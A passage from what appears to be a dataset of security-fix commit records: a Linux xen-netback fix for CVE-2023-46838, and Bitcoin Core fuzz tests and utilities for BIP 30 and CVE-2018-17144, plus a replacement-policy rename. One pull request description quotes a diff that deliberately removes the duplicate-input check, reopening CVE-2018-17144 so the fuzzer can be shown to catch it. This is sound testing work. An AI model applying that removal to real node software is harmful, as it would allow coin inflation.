    \ ops above.\n+\t\t * because enough slots were converted to copy ops above or\
    \ some\n+\t\t * were empty.\n \t\t */\n \t\tkfree_skb(nskb);\n \t}"
  commit_message: 'xen-netback: don''t produce zero-size SKB frags


    While frontends may submit zero-size requests (wasting a precious slot),

    core networking code as of at least 3ece782693c4b ("sock: skb_copy_ubufs

    support for compound pages") can''t deal with SKBs when they have all

    zero-size fragments. Respond to empty requests right when populating

    fragments; all further processing is fragment based and hence won''t

    encounter these empty requests anymore.


    In a way this should have been that way from the beginning: When no data

    is to be transferred for a particular request, there''s not even a point

    in validating the respective grant ref. That''s no different from e.g.

    passing NULL into memcpy() when at the same time the size is 0.


    This is XSA-448 / CVE-2023-46838.


    Cc: stable@vger.kernel.org

    Signed-off-by: Jan Beulich <jbeulich@suse.com>

    Reviewed-by: Juergen Gross <jgross@suse.com>

    Reviewed-by: Paul Durrant <paul@xen.org>'
  commit_sha: c7ec4f2d684e17d69bbdd7c4324db0ef5daac26a
  repo_name: torvalds/linux
- commit_diff:
  - "--- a/src/test/fuzz/utxo_total_supply.cpp\n+++ b/src/test/fuzz/utxo_total_supply.cpp\n\
    @@ -119,7 +119,9 @@ FUZZ_TARGET(utxo_total_supply)\n     current_block = PrepareNextBlock();\n\
    \     StoreLastTxo();\n \n-    LIMITED_WHILE(fuzzed_data_provider.remaining_bytes(),\
    \ 100'000)\n+    // Limit to avoid timeout, but enough to cover duplicate_coinbase_height\n\
    +    // and CVE-2018-17144.\n+    LIMITED_WHILE(fuzzed_data_provider.remaining_bytes(),\
    \ 2'000)\n     {\n         CallOneOf(\n             fuzzed_data_provider,"
  commit_message: "Merge bitcoin/bitcoin#27780: fuzz: Avoid timeout in utxo_total_supply\n\
    \nfafb4da121b19ba1b7bd173e25651c64d1982fb4 fuzz: Avoid timeout in utxo_total_supply\
    \ (MarcoFalke)\n\nPull request description:\n\n  Looks like for high block counts\
    \ it may be better to mock the chain, otherwise a high limit will lead to fuzz\
    \ input bloat and timeouts, see https://github.com/bitcoin/bitcoin/pull/17860#issuecomment-1538252773.\n\
    \n  It can be checked that the fuzz target can still find the CVE, see https://github.com/bitcoin/bitcoin/pull/17860#pullrequestreview-1410594057\
    \ with a diff of:\n\n  ```diff\n  diff --git a/src/consensus/tx_check.cpp b/src/consensus/tx_check.cpp\n\
    \  index f949655909..6f4cfb5f51 100644\n  --- a/src/consensus/tx_check.cpp\n \
    \ +++ b/src/consensus/tx_check.cpp\n  @@ -39,8 +39,6 @@ bool CheckTransaction(const\
    \ CTransaction& tx, TxValidationState& state)\n       // the underlying coins\
    \ database.\n       std::set<COutPoint> vInOutPoints;\n       for (const auto&\
    \ txin : tx.vin) {\n  -        if (!vInOutPoints.insert(txin.prevout).second)\n\
    \  -            return state.Invalid(TxValidationResult::TX_CONSENSUS, \"bad-txns-inputs-duplicate\"\
    );\n       }\n\n       if (tx.IsCoinBase())\n  ```\n\n  Also, fix a nit, see https://github.com/bitcoin/bitcoin/pull/17860#discussion_r1186451948\n\
    \nACKs for top commit:\n  dergoegge:\n    ACK fafb4da121b19ba1b7bd173e25651c64d1982fb4\n\
    \nTree-SHA512: a28fe9cd6ebb4c9bed5a5b35be76c1c436a87586c8fc3b3c4c8559a4a77ac08098324370da421d794c99579882c0872b6b29415de47ade6a05a08504a3d494c4"
  commit_sha: 2a786ea3493c9c2c628137806271f77e62fbee05
  repo_name: bitcoin/bitcoin
- commit_diff:
  - "--- a/src/bench/block_assemble.cpp\n+++ b/src/bench/block_assemble.cpp\n@@ -27,7\
    \ +27,7 @@ static void AssembleBlock(benchmark::Bench& bench)\n     std::array<CTransactionRef,\
    \ NUM_BLOCKS - COINBASE_MATURITY + 1> txs;\n     for (size_t b{0}; b < NUM_BLOCKS;\
    \ ++b) {\n         CMutableTransaction tx;\n-        tx.vin.push_back(MineBlock(test_setup->m_node,\
    \ P2WSH_OP_TRUE));\n+        tx.vin.push_back(CTxIn{MineBlock(test_setup->m_node,\
    \ P2WSH_OP_TRUE)});\n         tx.vin.back().scriptWitness = witness;\n       \
    \  tx.vout.emplace_back(1337, P2WSH_OP_TRUE);\n         if (NUM_BLOCKS - b >=\
    \ COINBASE_MATURITY)"
  - "--- a/src/kernel/coinstats.cpp\n+++ b/src/kernel/coinstats.cpp\n@@ -123,7 +123,7\
    \ @@ static bool ComputeUTXOStats(CCoinsView* view, CCoinsStats& stats, T hash_obj,\
    \ c\n     uint256 prevkey;\n     std::map<uint32_t, Coin> outputs;\n     while\
    \ (pcursor->Valid()) {\n-        interruption_point();\n+        if (interruption_point)\
    \ interruption_point();\n         COutPoint key;\n         Coin coin;\n      \
    \   if (pcursor->GetKey(key) && pcursor->GetValue(coin)) {"
  - "--- a/src/test/fuzz/tx_pool.cpp\n+++ b/src/test/fuzz/tx_pool.cpp\n@@ -42,12 +42,12\
    \ @@ void initialize_tx_pool()\n     g_setup = testing_setup.get();\n \n     for\
    \ (int i = 0; i < 2 * COINBASE_MATURITY; ++i) {\n-        CTxIn in = MineBlock(g_setup->m_node,\
    \ P2WSH_OP_TRUE);\n+        COutPoint prevout{MineBlock(g_setup->m_node, P2WSH_OP_TRUE)};\n\
    \         // Remember the txids to avoid expensive disk access later on\n    \
    \     auto& outpoints = i < COINBASE_MATURITY ?\n                            \
    \   g_outpoints_coinbase_init_mature :\n                               g_outpoints_coinbase_init_immature;\n\
    -        outpoints.push_back(in.prevout);\n+        outpoints.push_back(prevout);\n\
    \     }\n     SyncWithValidationInterfaceQueue();\n }"
  - '--- a/src/test/fuzz/utxo_total_supply.cpp

    +++ b/src/test/fuzz/utxo_total_supply.cpp

    @@ -0,0 +1,165 @@

    +// Copyright (c) 2020 The Bitcoin Core developers

    +// Distributed under the MIT software license, see the accompanying

    +// file COPYING or http://www.opensource.org/licenses/mit-license.php.

    +

    +#include <chainparams.h>

    +#include <consensus/consensus.h>

    +#include <consensus/merkle.h>

    +#include <kernel/coinstats.h>

    +#include <node/miner.h>

    +#include <script/interpreter.h>

    +#include <streams.h>

    +#include <test/fuzz/FuzzedDataProvider.h>

    +#include <test/fuzz/fuzz.h>

    +#include <test/fuzz/util.h>

    +#include <test/util/mining.h>

    +#include <test/util/setup_common.h>

    +#include <validation.h>

    +#include <version.h>

    +

    +FUZZ_TARGET(utxo_total_supply)

    +{

    +    /** The testing setup that creates a chainman only (no chainstate) */

    +    ChainTestingSetup test_setup{

    +        CBaseChainParams::REGTEST,

    +        {

    +            "-testactivationheight=bip34@2",

    +        },

    +    };

    +    // Create chainstate

    +    test_setup.LoadVerifyActivateChainstate();

    +    auto& node{test_setup.m_node};

    +    auto& chainman{*Assert(test_setup.m_node.chainman)};

    +    FuzzedDataProvider fuzzed_data_provider(buffer.data(), buffer.size());

    +

    +    const auto ActiveHeight = [&]() {

    +        LOCK(chainman.GetMutex());

    +        return chainman.ActiveHeight();

    +    };

    +    const auto PrepareNextBlock = [&]() {

    +        // Use OP_FALSE to avoid BIP30 check from hitting early

    +        auto block = PrepareBlock(node, CScript{} << OP_FALSE);

    +        // Replace OP_FALSE with OP_TRUE

    +        {

    +            CMutableTransaction tx{*block->vtx.back()};

    +            tx.vout.at(0).scriptPubKey = CScript{} << OP_TRUE;

    +            block->vtx.back() = MakeTransactionRef(tx);

    +        }

    +        return block;

    +    };

    +

    +    /** The block template this fuzzer is working on */

    +    auto current_block = PrepareNextBlock();

    +    /** Append-only set of tx outpoints, entries are not removed when spent */

    +    std::vector<std::pair<COutPoint, CTxOut>> txos;

    +    /** The utxo stats at the chain tip */

    +    kernel::CCoinsStats utxo_stats;

    +    /** The total amount of coins in the utxo set */

    +    CAmount circulation{0};

    +

    +

    +    // Store the tx out in the txo map

    +    const auto StoreLastTxo = [&]() {

    +        // get last tx

    +        const CTransaction& tx = *current_block->vtx.back();

    +        // get last out

    +        const uint32_t i = tx.vout.size() - 1;

    +        // store it

    +        txos.emplace_back(COutPoint{tx.GetHash(), i}, tx.vout.at(i));

    +        if (current_block->vtx.size() == 1 && tx.vout.at(i).scriptPubKey[0] ==
    OP_RETURN) {

    +            // also store coinbase

    +            const uint32_t i = tx.vout.size() - 2;

    +            txos.emplace_back(COutPoint{tx.GetHash(), i}, tx.vout.at(i));

    +        }

    +    };

    +    const auto AppendRandomTxo = [&](CMutableTransaction& tx) {

    +        const auto& txo = txos.at(fuzzed_data_provider.ConsumeIntegralInRange<size_t>(0,
    txos.size() - 1));

    +        tx.vin.emplace_back(txo.first);

    +        tx.vout.emplace_back(txo.second.nValue, txo.second.scriptPubKey); //
    "Forward" coin with no fee

    +    };

    +    const auto UpdateUtxoStats = [&]() {

    +        LOCK(chainman.GetMutex());

    +        chainman.ActiveChainstate().ForceFlushStateToDisk();

    +        utxo_stats = std::move(

    +            *Assert(kernel::ComputeUTXOStats(kernel::CoinStatsHashType::NONE,
    &chainman.ActiveChainstate().CoinsDB(), chainman.m_blockman, {})));

    +        // Check that miner can''t print more money than they are allowed to

    +        assert(circulation == utxo_stats.total_amount);

    +    };

    +

    +

    +    // Update internal state to chain tip

    +    StoreLastTxo();

    +    UpdateUtxoStats();

    +    assert(ActiveHeight() == 0);

    +    // Get at which height we duplicate the coinbase

    +    // Assuming that the fuzzer will mine relatively short chains (less than
    200 blocks), we want the duplicate coinbase to be not too high.

    +    // Up to 2000 seems reasonable.

    +    int64_t duplicate_coinbase_height = fuzzed_data_provider.ConsumeIntegralInRange(0,
    20 * COINBASE_MATURITY);

    +    // Always pad with OP_0 at the end to avoid bad-cb-length error

    +    const CScript duplicate_coinbase_script = CScript() << duplicate_coinbase_height
    << OP_0;

    +    // Mine the first block with this duplicate

    +    current_block = PrepareNextBlock();

    +    StoreLastTxo();

    +

    +    {

    +        // Create duplicate (CScript should match exact format as in CreateNewBlock)

    +        CMutableTransaction tx{*current_block->vtx.front()};

    +        tx.vin.at(0).scriptSig = duplicate_coinbase_script;

    +

    +        // Mine block and create next block template

    +        current_block->vtx.front() = MakeTransactionRef(tx);

    +    }

    +    current_block->hashMerkleRoot = BlockMerkleRoot(*current_block);

    +    assert(!MineBlock(node, current_block).IsNull());

    +    circulation += GetBlockSubsidy(ActiveHeight(), Params().GetConsensus());

    +

    +    assert(ActiveHeight() == 1);

    +    UpdateUtxoStats();

    +    current_block = PrepareNextBlock();

    +    StoreLastTxo();

    +

    +    LIMITED_WHILE(fuzzed_data_provider.remaining_bytes(), 100''000)

    +    {

    +        CallOneOf(

    +            fuzzed_data_provider,

    +            [&] {

    +                // Append an input-output pair to the last tx in the current
    block

    +                CMutableTransaction tx{*current_block->vtx.back()};

    +                AppendRandomTxo(tx);

    +                current_block->vtx.back() = MakeTransactionRef(tx);

    +                StoreLastTxo();

    +            },

    +            [&] {

    +                // Append a tx to the list of txs in the current block

    +                CMutableTransaction tx{};

    +                AppendRandomTxo(tx);

    +                current_block->vtx.push_back(MakeTransactionRef(tx));

    +                StoreLastTxo();

    +            },

    +            [&] {

    +                // Append the current block to the active chain

    +                node::RegenerateCommitments(*current_block, chainman);

    +                const bool was_valid = !MineBlock(node, current_block).IsNull();

    +

    +                const auto prev_utxo_stats = utxo_stats;

    +                if (was_valid) {

    +                    circulation += GetBlockSubsidy(ActiveHeight(), Params().GetConsensus());

    +

    +                    if (duplicate_coinbase_height == ActiveHeight()) {

    +                        // we mined the duplicate coinbase

    +                        assert(current_block->vtx.at(0)->vin.at(0).scriptSig
    == duplicate_coinbase_script);

    +                    }

    +                }

    +

    +                UpdateUtxoStats();

    +

    +                if (!was_valid) {

    +                    // utxo stats must not change

    +                    assert(prev_utxo_stats.hashSerialized == utxo_stats.hashSerialized);

    +                }

    +

    +                current_block = PrepareNextBlock();

    +                StoreLastTxo();

    +            });

    +    }

    +}'
  - "--- a/src/test/util/mining.cpp\n+++ b/src/test/util/mining.cpp\n@@ -6,19 +6,22\
    \ @@\n \n #include <chainparams.h>\n #include <consensus/merkle.h>\n+#include\
    \ <consensus/validation.h>\n #include <key_io.h>\n #include <node/context.h>\n\
    \ #include <pow.h>\n+#include <primitives/transaction.h>\n #include <script/standard.h>\n\
    \ #include <test/util/script.h>\n #include <util/check.h>\n #include <validation.h>\n\
    +#include <validationinterface.h>\n #include <versionbits.h>\n \n using node::BlockAssembler;\n\
    \ using node::NodeContext;\n \n-CTxIn generatetoaddress(const NodeContext& node,\
    \ const std::string& address)\n+COutPoint generatetoaddress(const NodeContext&\
    \ node, const std::string& address)\n {\n     const auto dest = DecodeDestination(address);\n\
    \     assert(IsValidDestination(dest));\n@@ -58,19 +61,52 @@ std::vector<std::shared_ptr<CBlock>>\
    \ CreateBlockChain(size_t total_height, const\n     return ret;\n }\n \n-CTxIn\
    \ MineBlock(const NodeContext& node, const CScript& coinbase_scriptPubKey)\n+COutPoint\
    \ MineBlock(const NodeContext& node, const CScript& coinbase_scriptPubKey)\n {\n\
    \     auto block = PrepareBlock(node, coinbase_scriptPubKey);\n+    auto valid\
    \ = MineBlock(node, block);\n+    assert(!valid.IsNull());\n+    return valid;\n\
    +}\n+\n+struct BlockValidationStateCatcher : public CValidationInterface {\n+\
    \    const uint256 m_hash;\n+    std::optional<BlockValidationState> m_state;\n\
    \ \n+    BlockValidationStateCatcher(const uint256& hash)\n+        : m_hash{hash},\n\
    +          m_state{} {}\n+\n+protected:\n+    void BlockChecked(const CBlock&\
    \ block, const BlockValidationState& state) override\n+    {\n+        if (block.GetHash()\
    \ != m_hash) return;\n+        m_state = state;\n+    }\n+};\n+\n+COutPoint MineBlock(const\
    \ NodeContext& node, std::shared_ptr<CBlock>& block)\n+{\n     while (!CheckProofOfWork(block->GetHash(),\
    \ block->nBits, Params().GetConsensus())) {\n         ++block->nNonce;\n     \
    \    assert(block->nNonce);\n     }\n \n-    bool processed{Assert(node.chainman)->ProcessNewBlock(block,\
    \ true, true, nullptr)};\n-    assert(processed);\n-\n-    return CTxIn{block->vtx[0]->GetHash(),\
    \ 0};\n+    auto& chainman{*Assert(node.chainman)};\n+    const auto old_height\
    \ = WITH_LOCK(chainman.GetMutex(), return chainman.ActiveHeight());\n+    bool\
    \ new_block;\n+    BlockValidationStateCatcher bvsc{block->GetHash()};\n+    RegisterValidationInterface(&bvsc);\n\
    +    const bool processed{chainman.ProcessNewBlock(block, true, true, &new_block)};\n\
    +    const bool duplicate{!new_block && processed};\n+    assert(!duplicate);\n\
    +    UnregisterValidationInterface(&bvsc);\n+    SyncWithValidationInterfaceQueue();\n\
    +    const bool was_valid{bvsc.m_state && bvsc.m_state->IsValid()};\n+    assert(old_height\
    \ + was_valid == WITH_LOCK(chainman.GetMutex(), return chainman.ActiveHeight()));\n\
    +\n+    if (was_valid) return {block->vtx[0]->GetHash(), 0};\n+    return {};\n\
    \ }\n \n std::shared_ptr<CBlock> PrepareBlock(const NodeContext& node, const CScript&\
    \ coinbase_scriptPubKey,"
  - "--- a/src/test/util/setup_common.cpp\n+++ b/src/test/util/setup_common.cpp\n\
    @@ -214,7 +214,7 @@ ChainTestingSetup::~ChainTestingSetup()\n     m_node.chainman.reset();\n\
    \ }\n \n-void TestingSetup::LoadVerifyActivateChainstate()\n+void ChainTestingSetup::LoadVerifyActivateChainstate()\n\
    \ {\n     auto& chainman{*Assert(m_node.chainman)};\n     node::ChainstateLoadOptions\
    \ options;\n@@ -244,10 +244,10 @@ TestingSetup::TestingSetup(\n     const std::vector<const\
    \ char*>& extra_args,\n     const bool coins_db_in_memory,\n     const bool block_tree_db_in_memory)\n\
    -    : ChainTestingSetup(chainName, extra_args),\n-      m_coins_db_in_memory(coins_db_in_memory),\n\
    -      m_block_tree_db_in_memory(block_tree_db_in_memory)\n+    : ChainTestingSetup(chainName,\
    \ extra_args)\n {\n+    m_coins_db_in_memory = coins_db_in_memory;\n+    m_block_tree_db_in_memory\
    \ = block_tree_db_in_memory;\n     // Ideally we'd move all the RPC tests to the\
    \ functional testing framework\n     // instead of unit tests, but for now we\
    \ need these here.\n     RegisterAllCoreRPCCommands(tableRPC);"
  commit_message: "Merge bitcoin/bitcoin#17860: fuzz: BIP 30, CVE-2018-17144\n\nfa2d8b61f9343d350b67357a12f39b613c8ee8ad\
    \ fuzz: BIP 42, BIP 30, CVE-2018-17144 (MarcoFalke)\nfaae7d5c00c99b0f3e99a1fbffbf369645716dd1\
    \ Move LoadVerifyActivateChainstate to ChainTestingSetup (MarcoFalke)\nfa26e3462a0fb1a9ad116ed58afa6897798f2c24\
    \ Avoid dereferencing interruption_point if it is nullptr (MarcoFalke)\nfa846ee074822160077f3f7476b2af62a876dec7\
    \ test: Add util to mine invalid blocks (MarcoFalke)\n\nPull request description:\n\
    \n  Add a validation fuzz test for BIP 30 and CVE-2018-17144\n\nACKs for top commit:\n\
    \  dergoegge:\n    Code review ACK fa2d8b61f9343d350b67357a12f39b613c8ee8ad\n\
    \  mzumsande:\n    Tested ACK fa2d8b61f9343d350b67357a12f39b613c8ee8ad\n\nTree-SHA512:\
    \ 1f4620cc078709487abff24b304a6bb4eeab2e7628b392e2bc6de9cc0ce6745c413388ede6e93025d0c56eec905607ba9786633ef183e5779bf5183cc9ff92c0"
  commit_sha: 322ec63b01499c1ec52d3912ee382ebd59f2366b
  repo_name: bitcoin/bitcoin
- commit_diff:
  - '--- a/src/test/fuzz/utxo_total_supply.cpp

    +++ b/src/test/fuzz/utxo_total_supply.cpp

    @@ -0,0 +1,165 @@

    +// Copyright (c) 2020 The Bitcoin Core developers

    +// Distributed under the MIT software license, see the accompanying

    +// file COPYING or http://www.opensource.org/licenses/mit-license.php.

    +

    +#include <chainparams.h>

    +#include <consensus/consensus.h>

    +#include <consensus/merkle.h>

    +#include <kernel/coinstats.h>

    +#include <node/miner.h>

    +#include <script/interpreter.h>

    +#include <streams.h>

    +#include <test/fuzz/FuzzedDataProvider.h>

    +#include <test/fuzz/fuzz.h>

    +#include <test/fuzz/util.h>

    +#include <test/util/mining.h>

    +#include <test/util/setup_common.h>

    +#include <validation.h>

    +#include <version.h>

    +

    +FUZZ_TARGET(utxo_total_supply)

    +{

    +    /** The testing setup that creates a chainman only (no chainstate) */

    +    ChainTestingSetup test_setup{

    +        CBaseChainParams::REGTEST,

    +        {

    +            "-testactivationheight=bip34@2",

    +        },

    +    };

    +    // Create chainstate

    +    test_setup.LoadVerifyActivateChainstate();

    +    auto& node{test_setup.m_node};

    +    auto& chainman{*Assert(test_setup.m_node.chainman)};

    +    FuzzedDataProvider fuzzed_data_provider(buffer.data(), buffer.size());

    +

    +    const auto ActiveHeight = [&]() {

    +        LOCK(chainman.GetMutex());

    +        return chainman.ActiveHeight();

    +    };

    +    const auto PrepareNextBlock = [&]() {

    +        // Use OP_FALSE to avoid BIP30 check from hitting early

    +        auto block = PrepareBlock(node, CScript{} << OP_FALSE);

    +        // Replace OP_FALSE with OP_TRUE

    +        {

    +            CMutableTransaction tx{*block->vtx.back()};

    +            tx.vout.at(0).scriptPubKey = CScript{} << OP_TRUE;

    +            block->vtx.back() = MakeTransactionRef(tx);

    +        }

    +        return block;

    +    };

    +

    +    /** The block template this fuzzer is working on */

    +    auto current_block = PrepareNextBlock();

    +    /** Append-only set of tx outpoints, entries are not removed when spent */

    +    std::vector<std::pair<COutPoint, CTxOut>> txos;

    +    /** The utxo stats at the chain tip */

    +    kernel::CCoinsStats utxo_stats;

    +    /** The total amount of coins in the utxo set */

    +    CAmount circulation{0};

    +

    +

    +    // Store the tx out in the txo map

    +    const auto StoreLastTxo = [&]() {

    +        // get last tx

    +        const CTransaction& tx = *current_block->vtx.back();

    +        // get last out

    +        const uint32_t i = tx.vout.size() - 1;

    +        // store it

    +        txos.emplace_back(COutPoint{tx.GetHash(), i}, tx.vout.at(i));

    +        if (current_block->vtx.size() == 1 && tx.vout.at(i).scriptPubKey[0] ==
    OP_RETURN) {

    +            // also store coinbase

    +            const uint32_t i = tx.vout.size() - 2;

    +            txos.emplace_back(COutPoint{tx.GetHash(), i}, tx.vout.at(i));

    +        }

    +    };

    +    const auto AppendRandomTxo = [&](CMutableTransaction& tx) {

    +        const auto& txo = txos.at(fuzzed_data_provider.ConsumeIntegralInRange<size_t>(0,
    txos.size() - 1));

    +        tx.vin.emplace_back(txo.first);

    +        tx.vout.emplace_back(txo.second.nValue, txo.second.scriptPubKey); //
    "Forward" coin with no fee

    +    };

    +    const auto UpdateUtxoStats = [&]() {

    +        LOCK(chainman.GetMutex());

    +        chainman.ActiveChainstate().ForceFlushStateToDisk();

    +        utxo_stats = std::move(

    +            *Assert(kernel::ComputeUTXOStats(kernel::CoinStatsHashType::NONE,
    &chainman.ActiveChainstate().CoinsDB(), chainman.m_blockman, {})));

    +        // Check that miner can''t print more money than they are allowed to

    +        assert(circulation == utxo_stats.total_amount);

    +    };

    +

    +

    +    // Update internal state to chain tip

    +    StoreLastTxo();

    +    UpdateUtxoStats();

    +    assert(ActiveHeight() == 0);

    +    // Get at which height we duplicate the coinbase

    +    // Assuming that the fuzzer will mine relatively short chains (less than
    200 blocks), we want the duplicate coinbase to be not too high.

    +    // Up to 2000 seems reasonable.

    +    int64_t duplicate_coinbase_height = fuzzed_data_provider.ConsumeIntegralInRange(0,
    20 * COINBASE_MATURITY);

    +    // Always pad with OP_0 at the end to avoid bad-cb-length error

    +    const CScript duplicate_coinbase_script = CScript() << duplicate_coinbase_height
    << OP_0;

    +    // Mine the first block with this duplicate

    +    current_block = PrepareNextBlock();

    +    StoreLastTxo();

    +

    +    {

    +        // Create duplicate (CScript should match exact format as in CreateNewBlock)

    +        CMutableTransaction tx{*current_block->vtx.front()};

    +        tx.vin.at(0).scriptSig = duplicate_coinbase_script;

    +

    +        // Mine block and create next block template

    +        current_block->vtx.front() = MakeTransactionRef(tx);

    +    }

    +    current_block->hashMerkleRoot = BlockMerkleRoot(*current_block);

    +    assert(!MineBlock(node, current_block).IsNull());

    +    circulation += GetBlockSubsidy(ActiveHeight(), Params().GetConsensus());

    +

    +    assert(ActiveHeight() == 1);

    +    UpdateUtxoStats();

    +    current_block = PrepareNextBlock();

    +    StoreLastTxo();

    +

    +    LIMITED_WHILE(fuzzed_data_provider.remaining_bytes(), 100''000)

    +    {

    +        CallOneOf(

    +            fuzzed_data_provider,

    +            [&] {

    +                // Append an input-output pair to the last tx in the current
    block

    +                CMutableTransaction tx{*current_block->vtx.back()};

    +                AppendRandomTxo(tx);

    +                current_block->vtx.back() = MakeTransactionRef(tx);

    +                StoreLastTxo();

    +            },

    +            [&] {

    +                // Append a tx to the list of txs in the current block

    +                CMutableTransaction tx{};

    +                AppendRandomTxo(tx);

    +                current_block->vtx.push_back(MakeTransactionRef(tx));

    +                StoreLastTxo();

    +            },

    +            [&] {

    +                // Append the current block to the active chain

    +                node::RegenerateCommitments(*current_block, chainman);

    +                const bool was_valid = !MineBlock(node, current_block).IsNull();

    +

    +                const auto prev_utxo_stats = utxo_stats;

    +                if (was_valid) {

    +                    circulation += GetBlockSubsidy(ActiveHeight(), Params().GetConsensus());

    +

    +                    if (duplicate_coinbase_height == ActiveHeight()) {

    +                        // we mined the duplicate coinbase

    +                        assert(current_block->vtx.at(0)->vin.at(0).scriptSig
    == duplicate_coinbase_script);

    +                    }

    +                }

    +

    +                UpdateUtxoStats();

    +

    +                if (!was_valid) {

    +                    // utxo stats must not change

    +                    assert(prev_utxo_stats.hashSerialized == utxo_stats.hashSerialized);

    +                }

    +

    +                current_block = PrepareNextBlock();

    +                StoreLastTxo();

    +            });

    +    }

    +}'
  commit_message: 'fuzz: BIP 42, BIP 30, CVE-2018-17144'
  commit_sha: fa2d8b61f9343d350b67357a12f39b613c8ee8ad
  repo_name: bitcoin/bitcoin
- commit_diff:
  - "--- a/src/init.cpp\n+++ b/src/init.cpp\n@@ -560,7 +560,7 @@ void SetupServerArgs(ArgsManager&\
    \ argsman)\n     SetupChainParamsBaseOptions(argsman);\n \n     argsman.AddArg(\"\
    -acceptnonstdtxn\", strprintf(\"Relay and mine \\\"non-standard\\\" transactions\
    \ (%sdefault: %u)\", \"testnet/regtest only; \", !testnetChainParams->RequireStandard()),\
    \ ArgsManager::ALLOW_ANY | ArgsManager::DEBUG_ONLY, OptionsCategory::NODE_RELAY);\n\
    -    argsman.AddArg(\"-incrementalrelayfee=<amt>\", strprintf(\"Fee rate (in %s/kvB)\
    \ used to define cost of relay, used for mempool limiting and BIP 125 replacement.\
    \ (default: %s)\", CURRENCY_UNIT, FormatMoney(DEFAULT_INCREMENTAL_RELAY_FEE)),\
    \ ArgsManager::ALLOW_ANY | ArgsManager::DEBUG_ONLY, OptionsCategory::NODE_RELAY);\n\
    +    argsman.AddArg(\"-incrementalrelayfee=<amt>\", strprintf(\"Fee rate (in %s/kvB)\
    \ used to define cost of relay, used for mempool limiting and replacement policy.\
    \ (default: %s)\", CURRENCY_UNIT, FormatMoney(DEFAULT_INCREMENTAL_RELAY_FEE)),\
    \ ArgsManager::ALLOW_ANY | ArgsManager::DEBUG_ONLY, OptionsCategory::NODE_RELAY);\n\
    \     argsman.AddArg(\"-dustrelayfee=<amt>\", strprintf(\"Fee rate (in %s/kvB)\
    \ used to define dust, the value of an output such that it will cost more than\
    \ its value in fees at this fee rate to spend it. (default: %s)\", CURRENCY_UNIT,\
    \ FormatMoney(DUST_RELAY_TX_FEE)), ArgsManager::ALLOW_ANY | ArgsManager::DEBUG_ONLY,\
    \ OptionsCategory::NODE_RELAY);\n     argsman.AddArg(\"-bytespersigop\", strprintf(\"\
    Equivalent bytes per sigop in transactions for relay and mining (default: %u)\"\
    , DEFAULT_BYTES_PER_SIGOP), ArgsManager::ALLOW_ANY, OptionsCategory::NODE_RELAY);\n\
    \     argsman.AddArg(\"-datacarrier\", strprintf(\"Relay and mine data carrier\
    \ transactions (default: %u)\", DEFAULT_ACCEPT_DATACARRIER), ArgsManager::ALLOW_ANY,\
    \ OptionsCategory::NODE_RELAY);"
  - "--- a/src/node/mempool_args.cpp\n+++ b/src/node/mempool_args.cpp\n@@ -45,7 +45,7\
    \ @@ std::optional<bilingual_str> ApplyArgsManOptions(const ArgsManager& argsman,\
    \ con\n \n     if (auto hours = argsman.GetIntArg(\"-mempoolexpiry\")) mempool_opts.expiry\
    \ = std::chrono::hours{*hours};\n \n-    // incremental relay fee sets the minimum\
    \ feerate increase necessary for BIP 125 replacement in the mempool\n+    // incremental\
    \ relay fee sets the minimum feerate increase necessary for replacement in the\
    \ mempool\n     // and the amount the mempool min fee increases above the feerate\
    \ of txs evicted due to mempool limiting.\n     if (argsman.IsArgSet(\"-incrementalrelayfee\"\
    )) {\n         if (std::optional<CAmount> inc_relay_fee = ParseMoney(argsman.GetArg(\"\
    -incrementalrelayfee\", \"\"))) {"
  - "--- a/src/policy/rbf.cpp\n+++ b/src/policy/rbf.cpp\n@@ -65,15 +65,15 @@ std::optional<std::string>\
    \ GetEntriesForConflicts(const CTransaction& tx,\n     uint64_t nConflictingCount\
    \ = 0;\n     for (const auto& mi : iters_conflicting) {\n         nConflictingCount\
    \ += mi->GetCountWithDescendants();\n-        // BIP125 Rule #5: don't consider\
    \ replacing more than MAX_BIP125_REPLACEMENT_CANDIDATES\n+        // Rule #5:\
    \ don't consider replacing more than MAX_REPLACEMENT_CANDIDATES\n         // entries\
    \ from the mempool. This potentially overestimates the number of actual\n    \
    \     // descendants (i.e. if multiple conflicts share a descendant, it will be\
    \ counted multiple\n         // times), but we just want to be conservative to\
    \ avoid doing too much work.\n-        if (nConflictingCount > MAX_BIP125_REPLACEMENT_CANDIDATES)\
    \ {\n+        if (nConflictingCount > MAX_REPLACEMENT_CANDIDATES) {\n        \
    \     return strprintf(\"rejecting replacement %s; too many potential replacements\
    \ (%d > %d)\\n\",\n                              txid.ToString(),\n          \
    \                    nConflictingCount,\n-                             MAX_BIP125_REPLACEMENT_CANDIDATES);\n\
    +                             MAX_REPLACEMENT_CANDIDATES);\n         }\n     }\n\
    \     // Calculate the set of all transactions that would have to be evicted.\n\
    @@ -96,7 +96,7 @@ std::optional<std::string> HasNoNewUnconfirmed(const CTransaction&\
    \ tx,\n     }\n \n     for (unsigned int j = 0; j < tx.vin.size(); j++) {\n- \
    \       // BIP125 Rule #2: We don't want to accept replacements that require low\
    \ feerate junk to be\n+        // Rule #2: We don't want to accept replacements\
    \ that require low feerate junk to be\n         // mined first.  Ideally we'd\
    \ keep track of the ancestor feerates and make the decision\n         // based\
    \ on that, but for now requiring all new inputs to be confirmed works.\n     \
    \    //\n@@ -162,15 +162,15 @@ std::optional<std::string> PaysForRBF(CAmount original_fees,\n\
    \                                       CFeeRate relay_fee,\n                \
    \                       const uint256& txid)\n {\n-    // BIP125 Rule #3: The\
    \ replacement fees must be greater than or equal to fees of the\n+    // Rule\
    \ #3: The replacement fees must be greater than or equal to fees of the\n    \
    \ // transactions it replaces, otherwise the bandwidth used by those conflicting\
    \ transactions\n     // would not be paid for.\n     if (replacement_fees < original_fees)\
    \ {\n         return strprintf(\"rejecting replacement %s, less fees than conflicting\
    \ txs; %s < %s\",\n                          txid.ToString(), FormatMoney(replacement_fees),\
    \ FormatMoney(original_fees));\n     }\n \n-    // BIP125 Rule #4: The new transaction\
    \ must pay for its own bandwidth. Otherwise, we have a DoS\n+    // Rule #4: The\
    \ new transaction must pay for its own bandwidth. Otherwise, we have a DoS\n \
    \    // vector where attackers can cause a transaction to be replaced (and relayed)\
    \ repeatedly by\n     // increasing the fee by tiny amounts.\n     CAmount additional_fees\
    \ = replacement_fees - original_fees;"
  - "--- a/src/rpc/mempool.cpp\n+++ b/src/rpc/mempool.cpp\n@@ -690,7 +690,7 @@ static\
    \ RPCHelpMan getmempoolinfo()\n                 {RPCResult::Type::NUM, \"maxmempool\"\
    , \"Maximum memory usage for the mempool\"},\n                 {RPCResult::Type::STR_AMOUNT,\
